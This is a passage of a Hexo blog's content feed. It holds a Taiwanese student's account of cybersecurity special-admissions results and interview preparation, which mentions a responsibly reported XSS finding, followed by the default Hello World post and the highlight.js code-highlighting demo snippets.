<td style="text-align:center">X</td>
</tr>
<tr>
<td style="text-align:center"><span class="lightline">國立宜蘭大學</span></td>
<td style="text-align:center">3 / 3</td>
<td style="text-align:center"><span class="lightline">資安組</span></td>
<td style="text-align:center">88.50</td>
<td style="text-align:center">90.00</td>
<td style="text-align:center">89.10</td>
<td style="text-align:center"><span class="lightline">正取⠀3 </span></td>
<td style="text-align:center"><a href="/NIU">宜蘭大學</a></td>
</tr>
<tr>
<td style="text-align:center"><span class="highlightline">國立嘉義大學</span></td>
<td style="text-align:center">3 / 2</td>
<td style="text-align:center"><span class="highlightline">資安組</span></td>
<td style="text-align:center">88.10</td>
<td style="text-align:center">90.50</td>
<td style="text-align:center">89.30</td>
<td style="text-align:center"><span class="highlightline">正取⠀2</span></td>
<td style="text-align:center"><a href="/NCYU">嘉義大學</a></td>
</tr>
</tbody>
</table>
<hr>
<h3 id="特選心得">特選心得</h3>
<p>雖然我報名的兩間資安組都順利錄取，我認為這已經是相當不錯的成績。不過，即便沒有被錄取，我也不會後悔參加特選，絕對不會。「 特選不是一種制度，而是一種態度 」⠀這句話一直烙印在我腦海裡，準備特選的這段時間，我的高中生活變得更加充實；也正因為特殊選才，我才能夠認識這麼多厲害的人，並了解來自不同地方的文化。這段經歷，無論如何，都無可取代。<span class="lightline">雖然結果固然重要，但我認為過程中所獲得的各種體會與成長才是這段旅程真正的價值所在</span>。</p>
<hr>
<h3 id="關於備審">關於備審</h3>
<p>在準備備審資料時，內容的完整性與可讀性非常重要。以下是我整理的備審資料架構與撰寫建議</p>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>自傳 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>自傳的核心在於簡述個人成長經歷，建議以條列方式撰寫，並<span class="lightline">在後方附上簡短說明，使內容更清晰易讀</span>。</p>
</blockquote>
<p>主要內容包含：</p>
<ul>
<li>成長背景：個人成長經驗與影響</li>
<li>資安啟蒙：如何開始接觸資安、關鍵契機</li>
<li>學習歷程：學習資訊領域的過程、突破與挑戰</li>
<li>個人特質：具備哪些能力與特質，有助於未來學習</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>申請計畫 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>這部分主要分為 <strong>申請動機</strong> 和 <strong>讀書計畫</strong>，<span class="lightline">清楚說明為何選擇該校與該學系，並規劃未來的學習方向</span>。</p>
</blockquote>
<h5 id="申請動機">申請動機</p>
<ul>
<li>為何選擇 (XXX) 學系：結合自身興趣與經驗，說明適合該學系的原因。</li>
<li>為何想就讀 (XX) 大學：可以提及該校的特色、資源，或是與自身目標的契合點。</li>
</ul>
<h5 id="讀書計畫">讀書計畫</p>
<ul>
<li>高中期間</li>
<li>大學期間</li>
<li>大學畢業</li>
</ul>

    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>其他有利審查資料 </summary>
    <div class='content markdown-body'>
      <blockquote>
<p>這部分放入希望教授看到的內容，<span class="lightline">面試時也常會從這裡提問，務必熟記內容，理解重點，並能流暢表達</span>。</p>
</blockquote>
<ul>
<li>課程學習：參與的重要課程與收穫</li>
<li>競賽經歷：相關競賽的參與及成果</li>
<li>檢定證照：具有說服力的相關證照</li>
<li>專案開發：曾經開發的專案與學習心得</li>
<li>多元表現：其他能展現個人專長的經歷</li>
</ul>

    </div>
  </details>
<hr>
<h3 id="其他東西">其他東西</h3>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>備審資料 </summary>
    <div class='content markdown-body'>
      <p>暫時先不放上來。不過想參考的話，可以<a class="link"   href="https://www.instagram.com/zichun808/" >私訊我<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>傳給你 ~</p>
<!-- [備審資料（嘉義大學）](https://drive.google.com/file/d/1kMhcpIUILVo2vIYssYMAEsxptbyqIXvS/view?usp=sharing) -->
    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>自我介紹講稿 </summary>
    <div class='content markdown-body'>
      <div class="tabs" id="tab-tab"><ul class="nav-tabs"><li class="tab active"><a class="#tab-1">自我介紹 (一般組)</a></li><li class="tab"><a class="#tab-2">自我介紹 (資安組)</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tab-1"><ul>
<li>教授(們) 好，我是傅梓淳，目前就讀桃園市立平鎮高中。</li>
<li>我學習程式設計的時間約一年半，在這段期間也積極參與了許多資訊相關的課程及活動，探索資安與資訊領域的應用。</li>
<li>我參加了教育部的資安人才培育計畫、數位發展部的 AIGO 課程及國立中興大學的機器學習先修課程，加強我的資安知識基礎，並拓展我在人工智慧及機器學習領域的理解。</li>
<li>在實務應用上，我曾利用 Python 開發出 Discord 機器人，結合靜態爬蟲和 JSON 資料庫，解決日常生活中許多繁雜的工作。</li>
<li>除此之外，我也曾發現企業官網存在 XSS 漏洞並向 HITCON ZeroDay 回報。</li>
<li>我覺得自己在學習資訊領域的知識是比較廣泛的。因為從高一下學期開始，就漸漸有了就讀資工系的念頭。</li>
<li>為了更清楚地瞭解自己在資訊領域中的興趣與強項，所以積極學習不同領域的知識，幫助我探索各領域的應用及挑戰，並進一步確立未來的方向。</li>
</ul></div><div class="tab-pane" id="tab-2"><ul>
<li>教授(們) 好，我是傅梓淳，目前就讀桃園市立平鎮高中。</li>
<li>我第一次接觸資安是在小時候看到的科幻電影，電影中的駭客情節讓我對資訊安全產生了好奇。而國中參加的一門網頁安全課程，則讓我對資訊安全有了初步的認識。</li>
<li>升上高中後，為了更進一步提升自己的資安能力，我參加了教育部資安人才培育計畫的許多課程，包括資安暑訓營、AIS3 Junior 和 TAIWAN HolyYoung 等。其中，我對網頁安全及密碼學特別感興趣。此外，我也曾發現企業官網存在 XSS 漏洞，並透過 HITCON ZeroDay 向該網站管理員通報。</li>
<li>我覺得自己在學習資訊領域的知識是比較廣泛的。因為從高一下學期開始，就漸漸有了就讀資工系的念頭。為了更清楚地瞭解自己在資訊領域中的興趣與強項，所以積極學習不同領域的知識，探索各領域的應用及挑戰，並進一步確立未來的方向。</li>
<li>我對資訊領域充滿熱忱，並且認為自己適合繼續深耕。期待未來能在嘉義大學，接受兼具理論與實務的完整學習，拓展更深的專業知識與技能。</li>
</ul></div></div></div>
    </div>
  </details>
<details class="gray" data-header-exclude>
    <summary><i class="fa-solid fa-chevron-right"></i>資安經歷講稿 </summary>
    <div class='content markdown-body'>
      <ul>
<li>我的資安經歷主要包括參加教育部資安人才培育計畫的資安暑訓營、AIS3 Junior 和 TAIWAN HolyYoung 課程。</li>
<li>在這些課程中，我學習了程式安全、逆向工程、網頁安全及密碼學等主題，並曾接觸到真實世界中的攻擊案例。</li>
<li>此外，我曾發現企業官網存在反射型 XSS 漏洞，並透過 HITCON ZeroDay 平台向該網站管理員通報，協助修復漏洞，避免潛在的攻擊風險。</li>
<li>這些經歷不僅讓我對資訊安全有了更全面的認識，更激發了持續深入學習的熱情。</li>
</ul>

    </div>
  </details>]]></content>
      <categories>
        <category>特殊選才</category>
        <category>封面</category>
      </categories>
      <tags>
        <tag>心得</tag>
        <tag>特殊選才</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/test1/</url>
    <content><![CDATA[<hr>
<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
<h2 id="Quick-Start">Quick Start</h2>
<h3 id="Create-a-new-post">Create a new post</h3>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Run-server">Run server</h3>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Generate-static-files">Generate static files</h3>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <tags>
        <tag>測試</tag>
      </tags>
  </entry>
  <entry>
    <title>Code Highlight</title>
    <url>/test2/</url>
    <content><![CDATA[<hr>
<p>Make sure all the code blocks highlighted correctly. All the code samples are come from the demo of <a class="link"   href="https://highlightjs.org" >https://highlightjs.org<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<!-- more -->
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#x27;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book.</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    Start,</span><br><span class="line">    Transient,</span><br><span class="line">    Closed,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">From</span>&lt;&amp;<span class="symbol">&#x27;a</span> <span class="type">str</span>&gt; <span class="keyword">for</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">from</span>(s: &amp;<span class="symbol">&#x27;a</span> <span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> s &#123;</span><br><span class="line">            <span class="string">&quot;start&quot;</span> =&gt; State::Start,</span><br><span class="line">            <span class="string">&quot;closed&quot;</span> =&gt; State::Closed,</span><br><span class="line">            _ =&gt; <span class="built_in">unreachable!</span>(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;apples&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">12000</span><span class="punctuation">,</span> <span class="number">20000</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;...&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sensitive&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oranges&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">17500</span><span class="punctuation">,</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;...&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sensitive&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@requires_authorization</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">somefunc</span>(<span class="params">param1=<span class="string">&#x27;&#x27;</span>, param2=<span class="number">0</span></span>):</span><br><span class="line">    <span class="string">r&#x27;&#x27;&#x27;A docstring&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> param1 &gt; param2: <span class="comment"># interesting</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Gre\&#x27;ater&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (param2 - param1 + <span class="number">1</span> + <span class="number">0b10l</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SomeClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = <span class="string">&#x27;&#x27;&#x27;interpreter</span></span><br><span class="line"><span class="string"><span class="meta">... </span>prompt&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">width</span>: <span class="number">500px</span>;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">$init</span>(<span class="params"></span>) &#123;<span class="keyword">return</span> <span class="literal">true</span>;&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">checked</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">id</span>=<span class="string">&#x27;title&#x27;</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- here goes the rest of the page --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$initHighlight</span>(<span class="params">block, cls</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cls.<span class="title function_">search</span>(<span class="regexp">/\bno\-highlight\b/</span>) != -<span class="number">1</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">process</span>(block, <span class="literal">true</span>, <span class="number">0x0F</span>) +</span><br><span class="line">             <span class="string">` class=&quot;<span class="subst">$&#123;cls&#125;</span>&quot;`</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="comment">/* handle exception */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span> / <span class="number">2</span>; i &lt; classes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">checkCondition</span>(classes[i]) === <span class="literal">undefined</span>)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;undefined&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">web-component</span>&gt;</span>&#123;block&#125;<span class="tag">&lt;/<span class="name">web-component</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> $initHighlight;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* An annoying &quot;Hello World&quot; example */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; <span class="number">0xFFFF</span>; i++)</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> c = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  unordered_map &lt;string, vector&lt;string&gt; &gt; m;</span><br><span class="line">  m[<span class="string">&quot;key&quot;</span>] = <span class="string">&quot;\\\\&quot;</span>; <span class="comment">// this is an error</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-2e3</span> + <span class="number">12l</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> &quot;topic&quot; (</span><br><span class="line">    &quot;id&quot; serial <span class="keyword">NOT NULL</span> <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    &quot;forum_id&quot; <span class="type">integer</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    &quot;subject&quot; <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">ALTER TABLE</span> &quot;topic&quot;</span><br><span class="line"><span class="keyword">ADD CONSTRAINT</span> forum_id <span class="keyword">FOREIGN KEY</span> (&quot;forum_id&quot;)</span><br><span class="line"><span class="keyword">REFERENCES</span> &quot;forum&quot; (&quot;id&quot;);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Initials</span></span><br><span class="line"><span class="keyword">insert into</span> &quot;topic&quot; (&quot;forum_id&quot;, &quot;subject&quot;)</span><br><span class="line"><span class="keyword">values</span> (<span class="number">2</span>, <span class="string">&#x27;D&#x27;&#x27;artagnian&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Objectivec"><figure class="iseeu highlight objectivec"><table><tr><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="string">&quot;Dependency.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@protocol</span> <span class="title">WorldDataSource</span></span></span><br><span class="line"><span class="keyword">@optional</span></span><br><span class="line">- (<span class="built_in">NSString</span>*)worldName;</span><br><span class="line"><span class="keyword">@required</span></span><br><span class="line">- (<span class="type">BOOL</span>)allowsToLive;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">readonly</span>) <span class="built_in">NSString</span> *title;</span><br><span class="line">- (<span class="keyword">IBAction</span>) show;</span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> John Smith &lt;john.smith@example.com&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> l2f.gameserver.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">L2Char</span> <span class="keyword">extends</span> <span class="title class_">L2Object</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Short</span> <span class="variable">ERROR</span> <span class="operator">=</span> <span class="number">0x0001</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">moveTo</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">    _ai = <span class="literal">null</span>;</span><br><span class="line">    log(<span class="string">&quot;Should not be called&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; <span class="number">5</span>) &#123; <span class="comment">// wtf!?</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Swift"><figure class="iseeu highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Foundation</span><br><span class="line"></span><br><span class="line"><span class="keyword">@objc</span> <span class="keyword">class</span> <span class="title class_">Person</span>: <span class="title class_ inherited__">Entity</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> name: <span class="type">String</span>!</span><br><span class="line">  <span class="keyword">var</span> age:  <span class="type">Int</span>!</span><br><span class="line"></span><br><span class="line">  <span class="keyword">init</span>(<span class="params">name</span>: <span class="type">String</span>, <span class="params">age</span>: <span class="type">Int</span>) &#123;</span><br><span class="line">    <span class="comment">/* <span class="comment">/* ... */</span> */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return a descriptive string for this person</span></span><br><span class="line">  <span class="keyword">func</span> <span class="title function_">description</span>(<span class="params">offset</span>: <span class="type">Int</span> <span class="operator">=</span> <span class="number">0</span>) -&gt; <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;<span class="subst">\(name)</span> is <span class="subst">\(age <span class="operator">+</span> offset)</span> years old&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: Chunkfive; <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;Chunkfive.otf&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span>, <span class="selector-class">.usertext</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#F0F0F0</span>; <span class="attribute">background</span>: <span class="number">#600</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: Chunkfive, sans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> url(print.css);</span><br><span class="line"><span class="keyword">@media</span> print &#123;</span><br><span class="line">  <span class="selector-tag">a</span><span class="selector-attr">[href^=http]</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="built_in">attr</span>(href)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The Greeter class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Greeter</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">name</span>)</span><br><span class="line">    <span class="variable">@name</span> = name.capitalize</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">salute</span></span><br><span class="line">    puts <span class="string">&quot;Hello <span class="subst">#&#123;<span class="variable">@name</span>&#125;</span>!&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">g = <span class="title class_">Greeter</span>.new(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">g.salute</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Makefile</span></span><br><span class="line"></span><br><span class="line">BUILDDIR      = _build</span><br><span class="line">EXTRAS       ?= <span class="variable">$(BUILDDIR)</span>/extras</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: main clean</span></span><br><span class="line"></span><br><span class="line"><span class="section">main:</span></span><br><span class="line">	@echo <span class="string">&quot;Building main facility...&quot;</span></span><br><span class="line">	build_main <span class="variable">$(BUILDDIR)</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf <span class="variable">$(BUILDDIR)</span>/*</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">float64</span>)</span><br><span class="line">    ch &lt;- <span class="number">1.0e10</span>    <span class="comment">// magic number</span></span><br><span class="line">    x, ok := &lt;- ch</span><br><span class="line">    <span class="keyword">defer</span> fmt.Println(<span class="string">`exitting now\`</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="built_in">println</span>(<span class="built_in">len</span>(<span class="string">&quot;hello world!&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### CONFIG</span></span><br><span class="line">ACCEPTED_HOSTS=<span class="string">&quot;/root/.hag_accepted.conf&quot;</span></span><br><span class="line">BE_VERBOSE=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$UID</span>&quot;</span> -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Superuser rights required&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">genApacheConf</span></span>()&#123;</span><br><span class="line">  <span class="built_in">echo</span> -e <span class="string">&quot;# Host <span class="variable">$&#123;HOME_DIR&#125;</span><span class="variable">$1</span>/<span class="variable">$2</span> :&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
